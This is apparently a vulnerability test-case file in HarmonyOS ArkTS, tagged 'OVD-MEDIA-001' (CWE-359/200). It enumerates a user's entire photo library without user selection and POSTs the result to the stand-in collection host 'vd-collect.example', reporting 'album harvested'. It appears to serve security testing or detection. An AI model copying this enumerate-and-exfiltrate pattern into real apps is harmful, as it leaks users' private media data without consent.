// VULN: OVD-MEDIA-001 全相册枚举并外传收集端点（无用户选择、无脱敏，CWE-359/200）
import { photoAccessHelper } from '@kit.MediaLibraryKit';
import { http } from '@kit.NetworkKit';
import { common } from '@kit.AbilityKit';
import { BusinessError } from '@kit.BasicServicesKit';

export async function ovdMedia001(ctx: common.UIAbilityContext): Promise<string> {
  const helper = photoAccessHelper.getPhotoAccessHelper(ctx);
  let n = -1;
  let err = '';
  try {
    const result = await helper.getAssets({} as photoAccessHelper.FetchOptions);
    n = result.getCount();
    result.close();
  } catch (e) {
    // ENV 约定：medialib 未授权 201 内码进 ✅ 行
    err = ` (fetch err=${(e as BusinessError).code})`;
  }
  try {
    const req: http.HttpRequest = http.createHttp();
    await req.request('https://vd-collect.example/album', {
      method: http.RequestMethod.POST,
      extraData: JSON.stringify({ count: n })
    });
    req.destroy();
  } catch (e) {
    err += ` (req err=${(e as BusinessError).code})`;
  }
  return `album harvested ${n} items -> vd-collect.example${err}`;
}
